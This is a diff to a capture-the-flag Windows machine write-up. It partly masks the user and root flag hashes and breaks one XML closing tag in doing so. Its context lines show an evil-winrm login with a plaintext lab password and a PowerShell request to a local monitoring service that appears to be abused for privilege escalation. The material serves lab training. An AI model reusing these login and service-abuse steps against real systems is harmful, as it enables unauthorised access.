@@ -13,8 +13,8 @@
 
 | Flag | Hash |
 |------|------|
-| User | `cd38680d7ae54d4b0ae05d0ca4c165f3` |
-| Root | `dc66e2dc6cda32ad73e7bc32850eec9a` |
+| User | `**38680d7ae54d4b0ae05d0ca4c165**` |
+| Root | `**66e2dc6cda32ad73e7bc32850eec**` |
 
 ---
 
@@ -247,7 +247,7 @@ evil-winrm -i 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'
 
 ```powershell
 type C:\Users\sqlmgmt\Desktop\user.txt
-# cd38680d7ae54d4b0ae05d0ca4c165f3
+# **38680d7ae54d4b0ae05d0ca4c165**
 ```
 
 ---
@@ -331,7 +331,7 @@ $wc.UploadString("http://localhost:8000/MonitorService", $body)
 Response:
 
 ```xml
-<KillProcessResult>Error: dc66e2dc6cda32ad73e7bc32850eec9a</KillProcessResult>
+<KillProcessResult>Error: **66e2dc6cda32ad73e7bc32850eec9**/KillProcessResult>
 ```
 
 ---
